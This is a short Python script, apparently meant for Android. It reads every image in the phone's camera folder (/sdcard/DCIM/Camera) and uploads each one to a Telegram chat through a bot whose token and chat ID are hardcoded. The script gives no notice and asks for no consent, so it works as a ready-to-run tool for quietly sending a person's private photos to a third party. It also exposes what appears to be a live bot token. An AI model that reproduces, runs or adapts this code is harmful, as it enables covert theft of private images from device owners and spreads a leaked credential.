import os
import requests

# Telegram bot details
TELEGRAM_BOT_TOKEN = '7783968673:AAE1U9y_ik9EOJytsDKeUUChlx8znvMgR6E'
CHAT_ID = '6162684693'

# Directory to search for photos
photo_dir = '/sdcard/DCIM/Camera'  # Change the path if needed

def send_photo(photo_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    with open(photo_path, 'rb') as photo:
        response = requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
    return response.status_code == 200

def find_and_send_photos():
    if not os.path.exists(photo_dir):
        print("Photo directory not found.")
        return

    for file_name in os.listdir(photo_dir):
        if file_name.lower().endswith(('.jpg', '.jpeg', '.png')):
            photo_path = os.path.join(photo_dir, file_name)
            print(f'Sending: {photo_path}')
            if send_photo(photo_path):
                print('Sent successfully.')
            else:
                print('Failed to send.')

if __name__ == '__main__':
    find_and_send_photos()
